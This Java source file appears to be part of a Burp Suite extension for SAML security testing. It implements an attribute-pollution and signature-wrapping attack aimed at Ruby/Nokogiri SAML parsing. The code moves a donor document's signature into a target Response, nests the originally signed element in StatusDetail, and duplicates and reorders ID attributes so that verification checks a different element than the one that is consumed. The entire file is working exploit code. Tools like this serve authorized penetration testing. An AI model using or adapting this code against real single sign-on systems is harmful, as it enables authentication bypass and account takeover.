package burp.wrappers;

import burp.utilities.exceptions.SAMLException;
import burp.utilities.helpers.XMLHelpers;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.IOException;

import static burp.utilities.helpers.Constants.XML;
import static burp.utilities.helpers.Constants.XMLNS;

public class RubyNokogiriAttributePollutionExtension {

    public static String apply(Document document, Document src) throws SAMLException {
        try {
            XMLHelpers xmlHelpers = XMLHelpers.getInstance();

            Document newDoc = (Document) document.cloneNode(true);
            Document source = (Document) src.cloneNode(true);

            // Get the Response and Assertion elements.
            Element newResponse = (Element) newDoc.getElementsByTagNameNS("*", "Response").item(0);
            Element newAssertion = (Element) newDoc.getElementsByTagNameNS("*", "Assertion").item(0);

            if (newResponse == null) {
                throw new IllegalArgumentException("No 'Response' element found.");
            }

            if (newAssertion == null) {
                throw new IllegalArgumentException("No 'Assertion' element found.");
            }


            Element signature = null;

            Element sourceRoot = source.getDocumentElement();
            NodeList sourceSignatures = sourceRoot.getElementsByTagNameNS("*", "Signature");
            if (sourceSignatures.getLength() > 0) {
                signature = (Element) sourceSignatures.item(0);
            }

            if (signature == null) {
                throw new IllegalArgumentException("No signature found in donor document.");
            }

            xmlHelpers.removeAllSignatures(newDoc);
            Node importedSignature = newDoc.importNode(signature, true);

            String namePrefix = signature.getPrefix();
            String signatureNamespace = signature.getNamespaceURI();
            if (namePrefix != null && !namePrefix.isEmpty() && signatureNamespace != null) {
                String xmlnsAttrName = "xmlns:" + namePrefix;
                if (!newResponse.hasAttributeNS(XMLNS, namePrefix)) {
                    newResponse.setAttributeNS(
                            XMLNS,
                            xmlnsAttrName,
                            signatureNamespace
                    );
                }
            }

            newResponse.insertBefore(importedSignature, newResponse.getFirstChild().getNextSibling());

            // Wrap original document inside <StatusDetail>
            Element status = (Element) newResponse.getElementsByTagNameNS("*", "Status").item(0);
            if (status == null) {
                throw new IllegalArgumentException("No <Status> element found.");
            }

            String statusPrefix = status.getPrefix();
            String statusNamespace = status.getNamespaceURI();

            String qualifiedName = (statusPrefix != null && !statusPrefix.isEmpty())
                    ? statusPrefix + ":StatusDetail"
                    : "StatusDetail";

            Element newStatusDetail = newDoc.createElementNS(statusNamespace, qualifiedName);

            xmlHelpers.removeAllSignatures(source);
            xmlHelpers.removeEmptyTags(source);
            source.normalize();

            Element realSignedElement = (Element) newDoc.importNode(sourceRoot, true);

            newStatusDetail.appendChild(realSignedElement);
            status.appendChild(newStatusDetail);

            String originalSignedID = realSignedElement.getAttribute("ID");

            String prefix = newResponse.getPrefix();
            String namespace = newResponse.getNamespaceURI();
            if (prefix != null && !prefix.isEmpty() && namespace != null) {
                String attrName = prefix + ":ID";
                newResponse.setAttributeNS(
                        namespace,
                        attrName,
                        originalSignedID
                );
            } else {
                newResponse.setAttributeNS(
                        XML,
                        "xml:ID",
                        originalSignedID
                );
            }
            newResponse.removeAttribute("ID");
            newResponse.setAttribute("ID", originalSignedID);

            String xml = xmlHelpers.getString(newDoc, 0, true);

            // Swap the order of prefix:ID and ID attributes
            String prefixAttrName = (prefix != null && !prefix.isEmpty()) ? prefix + ":ID" : "xml:ID";
            String oldPattern = prefixAttrName + "=\"" + originalSignedID + "\"";
            String newPattern = "ID=\"" + originalSignedID + "\"";
            xml = xml.replaceFirst(oldPattern, newPattern);
            xml = xml.replaceFirst(newPattern, oldPattern);

            return xml;
        } catch (IOException e) {
            throw new SAMLException(e);
        }
    }
}
